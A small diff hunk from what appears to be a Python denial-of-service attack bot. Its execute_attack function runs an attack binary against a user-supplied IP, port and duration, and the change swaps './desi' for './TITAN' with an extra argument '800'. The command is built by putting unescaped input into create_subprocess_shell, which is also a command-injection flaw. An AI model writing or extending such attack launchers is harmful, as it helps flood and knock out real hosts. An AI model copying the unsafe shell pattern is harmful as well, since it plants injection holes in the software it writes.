@@ -241,7 +241,7 @@ async def execute_attack(ip, port, duration, username):
     try:
         # Start the attack process
         proc = await asyncio.create_subprocess_shell(
-            f"./desi {ip} {port} {duration}",
+            f"./TITAN {ip} {port} {duration} 800",
             stderr=asyncio.subprocess.PIPE
         )
 
